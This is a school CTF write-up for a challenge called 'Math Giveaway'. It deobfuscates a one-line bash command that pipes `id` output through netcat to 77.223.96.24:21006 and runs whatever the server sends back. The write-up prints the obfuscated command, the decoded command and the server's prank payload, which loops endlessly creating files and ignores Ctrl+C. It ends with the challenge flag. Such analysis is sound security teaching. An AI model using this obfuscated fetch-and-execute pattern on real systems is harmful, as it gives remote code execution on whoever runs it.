# Math Giveaway writeup
Let's run the command (spoiler: never do that before reading code):

```bash
$ bash -c 'echo "[*] Flag getter v1.0. Just tell me what is 2*2+2 and get yo flag!"; read q; if ! [[ $q -eq 6 ]]; then echo "[!] Incorrect answer :c"; else echo "[.] Gettin yo flag, please, stand by..."; srv="`echo "127.0.0.1" | sed "s/12/7/g" | sed "s/1/24/g" | sed "s/7.0/7.q/g" | sed "s/0/96/g" | sed "s/q/223/g"` `expr $(expr $(expr 20 \* 15)) \* $(expr $(expr 20 \* 5) - 30) + 6`"; if [[ `$(echo "==QPN1mY" | rev | base64 -d | base64 -d) -z ${srv};` -eq 0 ]]; then sleep 3; bash -c "`(echo "JZDFGQJ5HU6T2===" | base32 -d | base32 -d | bash;) | $(bash -c "echo bmM= | base64 -d") -n $(echo "${srv}")`"; else echo "[!] Plz check ur internet connection"; fi; fi;'
[*] Flag getter v1.0. Just tell me what is 2*2+2 and get yo flag!
```

`2 * 2 + 2 = 6`

```bash
6   
[.] Gettin yo flag, please, stand by...
```

It takes some time...

```bash
<skull ascii art>

WELL, sultanowskii != 5up3r_U53r_2004.
LMAO U GOT PWNED. NOW I WILL HAVE SOME FUN ON UR PC.
NEVER RUN STRANGE COMMANDS ANYMORE.
NOW GO AND READ THE SHIT YOU HAVE PASTED TO TERMINAL HAHAHA.
```

And then our console and current directory are spammed:

```bash
$ PWNED BY 5up3r_U53r_2004
PWNED BY 5up3r_U53r_2004
PWNED BY 5up3r_U53r_2004
PWNED BY 5up3r_U53r_2004
PWNED BY 5up3r_U53r_2004
ls
PWNED1  PWNED2  PWNED3  PWNED4  PWNED5  PWNED6
```

We got 'hacked' (in fact, something _way_ worse could have happened, but it's school CTF, so no real malware). Let's get to analysis. Firstly, some spaces and newlines:

```bash
echo "[*] Flag getter v1.0. Just tell me what is 2*2+2 and get yo flag!";
read q; 
if ! [[ $q -eq 6 ]];
then 
	echo "[!] Incorrect answer :c";
else 
	echo "[.] Gettin yo flag, please, stand by...";
	srv="`echo "127.0.0.1" | sed "s/12/7/g" | sed "s/1/24/g" | sed "s/7.0/7.q/g" | sed "s/0/96/g" | sed "s/q/223/g"` `expr $(expr $(expr 20 \* 15)) \* $(expr $(expr 20 \* 5) - 30) + 6`"; 
	if [[ `$(echo "==QPN1mY" | rev | base64 -d | base64 -d) -z ${srv};` -eq 0 ]];
	then
		sleep 3;
		bash -c "`(echo "JZDFGQJ5HU6T2===" | base32 -d | base32 -d | bash;) | $(bash -c "echo bmM= | base64 -d") -n $(echo "${srv}")`";
	else
		echo "[!] Plz check ur internet connection";
	fi;
fi;
```

Quite readable now. Lets see what this 'obfuscated' lines do:

```bash
$ echo "`echo "127.0.0.1" | sed "s/12/7/g" | sed "s/1/24/g" | sed "s/7.0/7.q/g" | sed "s/0/96/g" | sed "s/q/223/g"` `expr $(expr $(expr 20 \* 15)) \* $(expr $(expr 20 \* 5) - 30) + 6`"
77.223.96.24 21006
$ echo "==QPN1mY" | rev | base64 -d | base64 -d             
nc
$ echo "JZDFGQJ5HU6T2===" | base32 -d | base32 -d           
id
$ bash -c "echo bmM= | base64 -d"  
nc
```

And replace 'em with what actually do:

```bash
echo "[*] Flag getter v1.0. Just tell me what is 2*2+2 and get yo flag!";
read q; 
if ! [[ $q -eq 6 ]];
then 
	echo "[!] Incorrect answer :c";
else 
	echo "[.] Gettin yo flag, please, stand by...";
	srv="77.223.96.24 21006"; # destination address
	if [[ `nc -z ${srv};` -eq 0 ]]; # check if server is availiable
	then
		sleep 3;
		bash -c "`id | nc -n $(echo "${srv}")`"; # sending the output of id command to the server and execute everything that server returned.
	else
		echo "[!] Plz check ur internet connection";
	fi;
fi;
```

Script is clear now. It connects to **77.223.96.24:21006** (firstly checking if it's available or not) and sends there an `id` output. Then, the script executes commands that are sent by server.

Example of the `id` output:

```bash
$ id
uid=1000(sultanowskii) gid=1000(sultanowskii) groups=1000(sultanowskii),24(cdrom),25(floppy)
```

Back to the script. To understand what server does, let's manually send `id` output to the server (using pipeline -a `|`):

```bash
$ echo "`id | nc 77.223.96.24 21006`"
echo ""; echo ""; echo "============ PWNED BY 5up3r_U53r_2004 ============"; echo "     .... NO! ...                  ... MNO! ..."; echo "   ..... MNO!! ...................... MNNOO! ..."; echo " ..... MMNO! ......................... MNNOO!! ."; echo ".... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! ."; echo " ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ...."; echo "    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ..."; echo "   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! ....."; echo "   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...  "; echo "    ....... MMMMM..    OPPMMP    .,OMI! ...."; echo "     ...... MMMM::   o.,OPMP,.o   ::I!! ..."; echo "         .... NNM:::.,,OOPM!P,.::::!! ...."; echo "          .. MMNNNNNOOOOPMO!!IIPPO!!O! ....."; echo "         ... MMMMMNNNNOO:!!:!!IPPPPOO! ...."; echo "           .. MMMMMNNOOMMNNIIIPPPOO!! ......"; echo "          ...... MMMONNMMNNNIIIOO!.........."; echo "       ....... MN MOMMMNNNIIIIIO! OO .........."; echo "    ......... MNO! IiiiiiiiiiiiI OOOO ..........."; echo "  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........"; echo "   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........"; echo "   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........"; echo "      ...... OO! ................. ON! ......."; echo "         ................................"; echo "==================================================="; echo ""; echo "WELL, sultanowskii != 5up3r_U53r_2004."; echo "LMAO U GOT PWNED. NOW I WILL HAVE SOME FUN ON UR PC."; echo "NEVER RUN STRANGE COMMANDS ANYMORE."; echo "NOW GO AND READ THE SHIT YOU HAVE PASTED TO TERMINAL HAHAHA.";
trap '' 2
(for i in {1..10000000};
do
    touch "PWNED${i}";
    echo "PWNED BY 5up3r_U53r_2004";
    sleep 1;
done; ) &
```

Server sends a sequence of the commands, and the script then executes them. If we send something different from the `id` output:

```bash
$ nc 77.223.96.24 21006
?
GTFO, not ur business
$ nc 77.223.96.24 21006
asdadaadgaazxchzjkc
GTFO, not ur business
```

Here is the full message:

```bash
============ PWNED BY 5up3r_U53r_2004 ============
     .... NO! ...                  ... MNO! ...
   ..... MNO!! ...................... MNNOO! ...
 ..... MMNO! ......................... MNNOO!! .
.... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .
 ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....
    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...
   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....
   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...  
    ....... MMMMM..    OPPMMP    .,OMI! ....
     ...... MMMM::   o.,OPMP,.o   ::I!! ...
         .... NNM:::.,,OOPM!P,.::::!! ....
          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....
         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....
           .. MMMMMNNOOMMNNIIIPPPOO!! ......
          ...... MMMONNMMNNNIIIOO!..........
       ....... MN MOMMMNNNIIIIIO! OO ..........
    ......... MNO! IiiiiiiiiiiiI OOOO ...........
  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........
   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........
   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........
      ...... OO! ................. ON! .......
         ................................
===================================================

WELL, sultanowskii != 5up3r_U53r_2004.
LMAO U GOT PWNED. NOW I WILL HAVE SOME FUN ON UR PC.
NEVER RUN STRANGE COMMANDS ANYMORE.
NOW GO AND READ THE SHIT YOU HAVE PASTED TO TERMINAL HAHAHA.
```

Attacker's username is `5up3r_U53r_2004`. And our nickname is compared to it (for instance, `sultanowskii != 5up3r_U53r_2004`). Seems like silly authorization. Let's try to run this script as `5up3r_U53r_2004`:

```bash
$ # create user with name 5up3r_U53r_2004
$ sudo adduser 5up3r_U53r_2004 --force-badname
<user creation procedure>
$ # login as 5up3r_U53r_2004 in terminal
$ su - 5up3r_U53r_2004
```

Run the script:

```bash
$ # run the given command
$ bash -c 'echo "[*] Math Giveaway v1.0. Just tell me what is 2*2+2 and get yo flag!"; read q; if ! [[ $q -eq 6 ]]; then echo "[!] Incorrect answer :c"; else echo "[.] Gettin yo flag, please, stand by..."; srv="`echo "127.0.0.1" | sed "s/12/7/g" | sed "s/1/24/g" | sed "s/7.0/7.q/g" | sed "s/0/96/g" | sed "s/q/223/g"` `expr $(expr $(expr 20 \* 15)) \* $(expr $(expr 20 \* 5) - 30) + 6`"; if [[ `$(echo "==QPN1mY" | rev | base64 -d | base64 -d) -z ${srv}; echo $?;` -eq 0 ]]; then sleep 3; bash -c "`(echo "JZDFGQJ5HU6T2===" | base32 -d | base32 -d | bash;) | $(bash -c "echo bmM= | base64 -d") -n $(echo "${srv}")`"; else echo "[!] Plz check ur internet connection"; fi; fi;'
[*] Math Giveaway v1.0. Just tell me what is 2*2+2 and get yo flag!
6
[.] Gettin yo flag, please, stand by...
WELL, 5up3r_U53r_2004 == 5up3r_U53r_2004.
li2CTF{4lw4y5_ch3ck_wh47_u_CTRL+C_and_CTRL+V_70_ur_73rm1n4l!}
```

Flag: `li2CTF{4lw4y5_ch3ck_wh47_u_CTRL+C_and_CTRL+V_70_ur_73rm1n4l!}`
